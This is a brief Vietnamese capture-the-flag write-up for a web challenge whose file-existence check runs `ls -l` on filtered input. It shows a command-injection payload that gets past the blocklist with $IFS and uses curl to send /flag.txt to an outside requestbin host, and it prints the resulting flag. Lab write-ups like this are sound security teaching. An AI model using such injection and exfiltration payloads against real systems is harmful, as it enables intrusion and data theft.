Link challenge: https://battle.cookiearena.org/challenges/web/the-existed-file.

Flag được đặt trong `/flag.txt` và input được filter blocklist.

![image](https://github.com/toovyz/blog/assets/90684283/a2845ca1-19c2-49b3-a92a-5645288ce549)

Nhập tên path của file và system sẽ kiểm tra xem file đó có tồn tại hay không. 

Mở file download biết được hệ thống sẽ dùng command `ls -l` để check file.

![image](https://github.com/toovyz/blog/assets/90684283/7d2b3e4c-8b6e-43cb-87bb-4ed09123aacb)

Blacklist như sau.

![image](https://github.com/toovyz/blog/assets/90684283/20a9cba5-88cc-42b4-a3cb-940c9fa8a366")

Submit thử flag này --> fake flag.

![image](https://github.com/toovyz/blog/assets/90684283/a5c4c1b2-1714-47bd-a39c-3c878582d724)

Dùng kĩ thuật OAST truyền dữ liệu file `/flag.txt` bằng `curl`.

![image](https://github.com/toovyz/blog/assets/90684283/4cc9c6ab-b3c6-4ce8-a2d5-2fe894e5ec59)

Xử lí khoảng trắng bằng biến `$IFS`.

![image](https://github.com/toovyz/blog/assets/90684283/ee8604fb-b079-4233-8549-880225807ed7)

Dùng https://public.requestbin.com/ tạo request.

![image](https://github.com/toovyz/blog/assets/90684283/28874487-49d0-4cf6-9093-3e4798652fdf)

Chèn payload: `$(curl${IFS}-d${IFS}@/flag.txt${IFS}https://enzf2g6uj1s0n.x.pipedream.net/)`.

![image](https://github.com/toovyz/blog/assets/90684283/78383d87-2f87-4296-bd85-aa7f6cbf832e)

Quay lại requestbin và nhận được flag.

![image](https://github.com/toovyz/blog/assets/90684283/44043c12-d8c7-4e18-8bd7-8466dace0447)

Flag: `CHH{os_c0mManD_INj3cTi0N_bypa5S_FIL7Er_b6d117badd6720ee45ac06825dab15d2}`.



